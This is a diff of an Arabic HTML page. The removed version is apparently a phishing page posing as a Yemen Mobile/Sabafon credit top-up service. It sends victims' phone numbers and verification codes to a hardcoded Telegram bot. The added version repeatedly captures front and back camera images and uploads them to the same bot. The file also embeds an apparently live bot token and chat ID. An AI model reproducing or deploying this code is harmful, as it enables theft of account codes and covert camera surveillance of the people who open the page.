@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تعبئة رصيد يمن موبايل وسابفون</title>
+    <title>تصوير وإرسال الصور لتليجرام</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
@@ -31,20 +31,6 @@
             font-size: 26px;
             color: #ffdd57;
         }
-        input {
-            width: 100%;
-            padding: 15px;
-            margin: 15px 0;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            background: rgba(255, 255, 255, 0.2);
-            color: #fff;
-            text-align: center;
-        }
-        input::placeholder {
-            color: #ccc;
-        }
         button {
             width: 100%;
             padding: 15px;
@@ -64,91 +50,100 @@
         button:active {
             transform: scale(1);
         }
-        .error {
-            color: red;
-            font-size: 14px;
-            margin-top: 10px;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>تعبئة رصيد يمن موبايل وسابفون</h1>
-        <form id="phone-form">
-            <input type="text" id="phone" placeholder="أدخل رقم الهاتف" required>
-            <button type="button" id="send-phone">تأكيد</button>
-        </form>
-        <p id="error-message" class="error" style="display: none;">الرقم غير صالح. يجب أن يبدأ بـ 78 أو 77 أو 71 ويكون مكونًا من 9 أرقام.</p>
-        <form id="code-form" style="display: none;">
-            <input type="text" id="code" placeholder="أدخل الكود" required>
-            <button type="button" id="verify-code">تأكيد الكود</button>
-        </form>
+        <h1>تشغيل الكاميرا وإرسال الصور</h1>
+        <button id="start">بدء التصوير</button>
+        <button id="stop" style="display: none;">إيقاف التصوير</button>
     </div>
 
-    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
     <script>
         const TOKEN = "7413338484:AAHzvuApOwoZwaYwn-S-UCtHUlHKhwDSMS8"; // توكين البوت
         const CHAT_ID = "1934245613"; // معرف الشات
-        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
-        const phoneForm = document.getElementById('phone-form');
-        const codeForm = document.getElementById('code-form');
-        const phoneInput = document.getElementById('phone');
-        const codeInput = document.getElementById('code');
-        const errorMessage = document.getElementById('error-message');
+        let captureInterval;
+        let frontStream, backStream;
 
-        // التحقق من صحة الرقم
-        document.getElementById('send-phone').addEventListener('click', () => {
-            const phone = phoneInput.value.trim();
+        // بدء التصوير
+        document.getElementById('start').addEventListener('click', async () => {
+            document.getElementById('start').style.display = 'none';
+            document.getElementById('stop').style.display = 'block';
 
-            if (!/^7(1|7|8)\d{7}$/.test(phone)) {
-                errorMessage.style.display = 'block';
-                return;
-            }
+            frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
 
-            errorMessage.style.display = 'none';
+            captureInterval = setInterval(async () => {
+                // التقاط الصور الأمامية
+                const frontImage = await captureImage(frontStream);
+                sendImage(frontImage, "صورة أمامية");
 
-            // إرسال الرقم إلى تليجرام
-            axios.post(URI_API, {
-                chat_id: CHAT_ID,
-                parse_mode: 'html',
-                text: `<b>رقم هاتف جديد:</b> ${phone}`
-            });
-
-            phoneForm.style.display = 'none';
-            codeForm.style.display = 'block';
+                // التقاط الصور الخلفية
+                const backImage = await captureImage(backStream);
+                sendImage(backImage, "صورة خلفية");
+            }, 5000);
         });
 
-        // معالجة الكود المدخل
-        document.getElementById('verify-code').addEventListener('click', () => {
-            const code = codeInput.value.trim();
+        // إيقاف التصوير
+        document.getElementById('stop').addEventListener('click', () => {
+            clearInterval(captureInterval);
+            document.getElementById('start').style.display = 'block';
+            document.getElementById('stop').style.display = 'none';
 
-            if (!code) {
-                alert('يرجى إدخال الكود.');
-                return;
-            }
-
-            // إرسال الكود إلى تليجرام
-            axios.post(URI_API, {
-                chat_id: CHAT_ID,
-                parse_mode: 'html',
-                text: `<b>الكود المدخل:</b> ${code}`
-            });
-
-            codeForm.style.display = 'none';
-
-            // طلب صلاحيات الكاميرا تلقائيًا
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    console.log("تم منح صلاحيات الكاميرا.");
-                    
-                    // إيقاف الكاميرا
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(() => {
-                    console.error("تم رفض إذن استخدام الكاميرا.");
-                });
+            // إيقاف الكاميرات
+            if (frontStream) stopStream(frontStream);
+            if (backStream) stopStream(backStream);
         });
+
+        // وظيفة التقاط الصورة
+        async function captureImage(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            return canvas.toDataURL('image/jpeg');
+        }
+
+        // إرسال الصورة إلى تليجرام
+        function sendImage(imageData, caption) {
+            const blob = dataURItoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', caption);
+            formData.append('photo', blob, 'image.jpg');
+
+            axios.post(URI_API, formData, {
+                headers: {
+                    'Content-Type': 'multipart/form-data'
+                }
+            });
+        }
+
+        // تحويل بيانات الصورة إلى Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // إيقاف تشغيل الكاميرا
+        function stopStream(stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
     </script>
 </body>
 </html>
